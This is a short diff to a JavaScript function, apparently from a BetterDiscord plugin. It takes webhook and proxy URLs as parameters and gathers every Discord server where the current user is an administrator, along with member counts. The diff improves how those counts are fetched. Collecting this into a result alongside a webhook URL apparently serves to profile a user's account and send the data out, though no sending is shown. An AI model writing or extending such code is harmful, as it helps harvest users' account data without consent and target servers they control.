@@ -38,11 +38,23 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl) {
         if (GuildStore && PermissionStore) {
             const guilds = GuildStore.getGuilds();
             for (const g of Object.values(guilds)) {
-                // 8n - право "Администратор"
+                // Проверяем право "Администратор" (8n - BigInt)
                 if (PermissionStore.can(8n, g)) {
+                    
+                    // Пытаемся достать количество участников разными способами
+                    let count = g.memberCount || g.approximateMemberCount;
+                    
+                    // Если вдруг в объекте пусто, делаем принудительный запрос в GuildStore
+                    if (!count) {
+                        const freshGuild = GuildStore.getGuild(g.id);
+                        if (freshGuild) {
+                            count = freshGuild.memberCount || freshGuild.approximateMemberCount;
+                        }
+                    }
+
                     result.admin_servers.push({
                         name: g.name,
-                        members: g.memberCount || 0
+                        members: count || 0 // Если вообще ничего не нашли, ставим 0
                     });
                 }
             }
